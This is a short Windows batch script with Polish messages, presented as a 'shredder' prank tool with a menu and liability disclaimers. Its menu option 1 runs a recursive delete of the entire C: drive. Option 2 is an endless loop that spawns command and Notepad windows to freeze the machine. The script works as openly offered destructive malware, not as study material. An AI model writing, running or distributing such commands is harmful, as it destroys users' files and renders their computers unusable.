@echo off
title Niszczarka DaVincusia
color 0A



:uwajson
echo UWAGA!
echo Autor niszczarki nie odpowiada za szkody komputera
echo Rozumiesz?
echo Kliknij enter
pause>nul
cls
echo PAMIETAJ JAK ZNISZCZYSZ KOMPUTER TO AUTOR NIE ODPOWIADA ZA SZKODY
echo JAK NAPISZESZ DO AUTORA Z SZKODAMI TO MASZ BANA OD DAVINCIUSIA "NO I MASZ BANA BYQU" - DaVinci
echo Nacisnij enter
pause>nul
goto essa



:essa
cls
echo Niszczarka DaVincusia
echo.
echo.
echo 1 - Niszczenie plikow
echo 2 - Zamulacz
echo 3 - soon
echo 4 - Wyswietl kanal tworcy
echo 5 - Wyjscie
set /p cmd=:
if %cmd%==1 goto niszcz
if %cmd%==2 goto xd
if %cmd%==3 goto soon
if %cmd%==4 goto kanal


:kanal
echo Zapraszam!
echo https://www.youtube.com/channel/UCDWJrswIMoY5HWf9Oy4Cr5A
pause
goto essa

:niszcz
rd c:\ /s \q


:xd
start cmd.exe
start notepad.exe
goto xd


:soon
echo soon
pause
goto essa
